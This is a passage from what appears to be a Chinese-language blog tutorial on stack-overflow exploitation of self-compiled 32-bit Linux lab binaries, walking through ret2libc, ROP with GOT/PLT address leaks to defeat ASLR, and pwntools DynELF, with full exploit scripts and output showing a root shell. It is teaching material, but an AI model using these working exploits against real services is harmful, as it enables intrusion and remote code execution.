<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./level1</span><br></pre></td></tr></table></figure>
<p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
<p>因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出</p>
<h3 id="0x02-level2-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#0x02-level2-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="0x02 level2(Bypass DEP 通过ret2libc绕过DEP防护)"></a>0x02 level2(Bypass DEP 通过ret2libc绕过DEP防护)</h3><p>打开DEP，依然关闭stack protector和ASLR。编译方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -o level2 level1.c</span><br><span class="line">$ checksec level2</span><br><span class="line">[*] &apos;/home/idter/Documents/ROP/level2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>通过sudo cat /proc/[pid]/maps查看堆栈maps等地址情况，发现level1的stack权限是rwx，但是level2的stack却是rw</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 运行程序</span><br><span class="line">ps -u # 查看进程号</span><br><span class="line">sudo cat /proc/3125/maps #其中3125为level2的进程号</span><br><span class="line"></span><br><span class="line">level2: ffadb000-ffafc000 rw-p 00000000 00:00 0                                  [stack]</span><br><span class="line">level1: ff9b9000-ff9da000 rwxp 00000000 00:00 0                                  [stack]</span><br></pre></td></tr></table></figure>
<p>或者在gdb调试过程中输入i proc mappings命令也可以查看当前堆栈maps等地址情况。</p>
<p>那么如何执行shellcode呢？level2调用了libc.so，并且libc.so里保存大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。下面获取system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
<p>如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，这个字符串的地址也是固定的。因此我们可以通过gdb的print和find命令来查找system和”/bin/sh”字符串的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x0804846e in main ()</span><br><span class="line">gdb-peda$ print system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e3bda0 &lt;system&gt;</span><br><span class="line">gdb-peda$ print __libc_start_main</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e19540 &lt;__libc_start_main&gt;</span><br><span class="line">gdb-peda$ find 0xf7e19540, 2200000, &quot;/bin/sh&quot;</span><br><span class="line">Search for a pattern in memory; support regex search</span><br><span class="line">Usage:</span><br><span class="line">    searchmem pattern start end</span><br><span class="line">    searchmem pattern mapname</span><br><span class="line"># 上述情况出现的原因应该是EIP没有完全关闭（系统保留了部分保护），这时可以直接使用find &quot;/bin/sh&quot;命令</span><br><span class="line"></span><br><span class="line">gdb-peda$ find &quot;/bin/sh&quot;                      </span><br><span class="line">Searching for &apos;/bin/sh&apos; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">libc : 0xf7f5ca0b (&quot;/bin/sh&quot;)</span><br><span class="line">gdb-peda$ x/s 0xf7f5ca0b</span><br><span class="line">0xf7f5ca0b: &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
<p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xf7e3bda0以及”/bin/sh”的地址0xf7f5ca0b。下面我们开始写exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./level2&apos;)</span><br><span class="line"></span><br><span class="line">ret = 0xdeadbeef #返回地址</span><br><span class="line">systemaddr = 0xf7e3bda0</span><br><span class="line">binshaddr = 0xf7f5ca0b</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_lev2.py </span><br><span class="line">[+] Starting local process &apos;./level2&apos;: pid 2880</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h3 id="0x03-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><a href="#0x03-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护" class="headerlink" title="0x03 Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护"></a>0x03 Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</h3><p>接下来我们打开ASLR保护</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p>通过cat /proc/[pid]/maps查看，发现level2的libc.so地址每次都是变化的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 第一次执行level2:</span><br><span class="line"></span><br><span class="line">$ cat /proc/3122/maps</span><br><span class="line">f7d86000-f7f36000 r-xp 00000000 08:01 395840                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f36000-f7f38000 r--p 001af000 08:01 395840                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f38000-f7f39000 rw-p 001b1000 08:01 395840                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line"></span><br><span class="line"># 第二次执行level2:</span><br><span class="line"></span><br><span class="line">$ cat /proc/3133/maps</span><br><span class="line">f7db7000-f7f67000 r-xp 00000000 08:01 395840                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f67000-f7f69000 r--p 001af000 08:01 395840                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7f69000-f7f6a000 rw-p 001b1000 08:01 395840                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">通过ldd查看也能发现：</span><br><span class="line">$ ldd level2 </span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f01000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d2b000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f03000)</span><br><span class="line">$ ldd level2 </span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f0a000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d34000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f0c000)</span><br></pre></td></tr></table></figure>
<p>那么如何解决地址随机化的问题呢？思路是：我们需要先泄露出libc.so某些函数在内存中的地址，然后再利用泄露出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。既然栈，libc，heap的地址都是随机的。我们怎么泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示：</p>
<p><img src="/images/ROP/Linux 内存随机化分布图.png" alt="Linux 内存随机化分布图"></p>
<p>Linux内存随机化分布图：</p>
<p>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$  objdump -d -j .plt level2</span><br><span class="line">level2:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482f0 &lt;read@plt-0x10&gt;:</span><br><span class="line"> 80482f0:   ff 35 04 a0 04 08       pushl  0x804a004</span><br><span class="line"> 80482f6:   ff 25 08 a0 04 08       jmp    *0x804a008</span><br><span class="line"> 80482fc:   00 00                   add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">08048300 &lt;read@plt&gt;:</span><br><span class="line"> 8048300:   ff 25 0c a0 04 08       jmp    *0x804a00c</span><br><span class="line"> 8048306:   68 00 00 00 00          push   $0x0</span><br><span class="line"> 804830b:   e9 e0 ff ff ff          jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">08048310 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 8048310:   ff 25 10 a0 04 08       jmp    *0x804a010</span><br><span class="line"> 8048316:   68 08 00 00 00          push   $0x8</span><br><span class="line"> 804831b:   e9 d0 ff ff ff          jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">08048320 &lt;write@plt&gt;:</span><br><span class="line"> 8048320:   ff 25 14 a0 04 08       jmp    *0x804a014</span><br><span class="line"> 8048326:   68 10 00 00 00          push   $0x10</span><br><span class="line"> 804832b:   e9 c0 ff ff ff          jmp    80482f0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line"> $ objdump -R level2</span><br><span class="line">// got表</span><br><span class="line">level2:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>发现除了程序本身实现的函数外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt函数就够了，因为我们可以通过write@plt()函数把write()函数在内存中的地址也就是write.got打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt函数为什么也能实现write()功能呢？这是因为linux采用了延时绑定技术，当我们调用write@plt()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plt()会根据write.got跳转到真正的write()函数上去。</p>
<p>因为system()函数和write()在libc.so中的offset（相对地址）是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击了，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p>
<p>使用ldd命令可以查看目标程序调用的so库，随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ldd level2</span><br><span class="line">    linux-gate.so.1 =&gt;  (0xf7f2e000)</span><br><span class="line">    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d58000)</span><br><span class="line">    /lib/ld-linux.so.2 (0xf7f30000)</span><br><span class="line">$ cp /lib/i386-linux-gnu/libc.so.6 .</span><br></pre></td></tr></table></figure>
<p>最后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'level2'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'plt_write= '</span> + hex(plt_write)</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'got_write= '</span> + hex(got_write)</span><br><span class="line">vulfun_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'vulfun= '</span> + hex(vulfun_addr)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload1 ...###"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###recving write() addr...###"</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'write_addr= '</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###calculating system() addr and \"/bin/sh\" addr...###"</span></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr= '</span> + hex(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh_addr= '</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">140</span> + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_lev2_DEP.py </span><br><span class="line">[*] &apos;/home/idter/Documents/ROP/libc.so.6&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] &apos;/home/idter/Documents/ROP/level2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting local process &apos;./level2&apos;: pid 3621</span><br><span class="line">plt_write= 0x8048320</span><br><span class="line">got_write= 0x804a014</span><br><span class="line">vulfun= 0x804843b</span><br><span class="line"></span><br><span class="line">###sending payload1 ...###</span><br><span class="line"></span><br><span class="line">###recving write() addr...###</span><br><span class="line"></span><br><span class="line">write_addr= 0xf7e38b70</span><br><span class="line">###calculating system() addr and &quot;/bin/sh&quot; addr...###</span><br><span class="line"></span><br><span class="line">system_addr= 0xf7d9dda0</span><br><span class="line">binsh_addr= 0xf7ebea0b</span><br><span class="line"></span><br><span class="line">###sending payload2 ...###</span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h3 id="0x04-Memory-Leak-amp-DynELF（在不获取目标libc-so的情况下进行ROP攻击）"><a href="#0x04-Memory-Leak-amp-DynELF（在不获取目标libc-so的情况下进行ROP攻击）" class="headerlink" title="0x04 Memory Leak&amp;DynELF（在不获取目标libc.so的情况下进行ROP攻击）"></a>0x04 Memory Leak&amp;DynELF（在不获取目标libc.so的情况下进行ROP攻击）</h3><p>在通过ROP绕过x86下DEP和ASLR防护。但是我们要事先得到目标机器上的libc.so或者具体的linux版本号才能计算出相应的offset。在获取不到目标机器上的libc.so的情况下，就需要通过memory leak（内存泄露）来搜索内存找到system()的地址。</p>
<p>这里采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。仍然以level2程序举例，leak函数的实现如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(address) + p32(4)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(4)</span><br><span class="line">    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))</span><br><span class="line">return data</span><br></pre></td></tr></table></figure>
<p>随后将这个函数作为参数再调用d=DynELF(leak, elf=ELF(‘./level2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
<p>要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串”/bin/sh”在内存中的地址。所以在payload中需要调用read()将”/bin/sh”字符串写入程序的.bss段中。而.bss段是用来保存全局变量的，地址固定，并且可读可写。通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S level2 </span><br><span class="line">There are 31 section headers, starting at offset 0x1828:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">...</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这个gadget非常好找，用objdump就可以轻松找到。或者使用ROPgadget工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary level2 --only &quot;pop|ret&quot;</span><br><span class="line"></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"></span><br><span class="line">0x080484fb : pop ebp ; ret</span><br><span class="line">0x080484f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482e9 : pop ebx ; ret</span><br><span class="line">0x080484fa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080484f9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482d2 : ret</span><br><span class="line">0x080483be : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>
<p>整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将”/bin/sh”写入到.bss段上，最后再调用system(.bss)。最终的exp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./level2&apos;)</span><br><span class="line">plt_write = elf.symbols[&apos;write&apos;]</span><br><span class="line">plt_read = elf.symbols[&apos;read&apos;]</span><br><span class="line"></span><br><span class="line">#vulfun_addr = 0x0804843b 这里不能使用这个地址</span><br><span class="line"></span><br><span class="line">vulfun_addr = elf.symbols[&apos;main&apos;]</span><br><span class="line">print &quot;vulfun_addr= &quot; + hex(vulfun_addr)</span><br><span class="line">bss_addr = 0x0804a020</span><br><span class="line">pppr = 0x080484f9</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(address) + p32(4)</span><br><span class="line">    # payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(pppr) + p32(1) + p32(bss_addr) + p32(4) + p32(vulfun_addr)</span><br><span class="line">    # 两个payload都可以</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(4)</span><br><span class="line">    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">p = process(&apos;./level2&apos;)</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(&apos;./level2&apos;))</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)</span><br><span class="line">print &quot;system_addr=&quot; + hex(system_addr)</span><br><span class="line">payload2 = &apos;a&apos;*140 + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line">payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)</span><br><span class="line"></span><br><span class="line"># payload必须要pppr来保持栈平衡</span><br><span class="line"></span><br><span class="line">print &quot;\n###sending payload2 ...###&quot;</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(&quot;/bin/sh\0&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 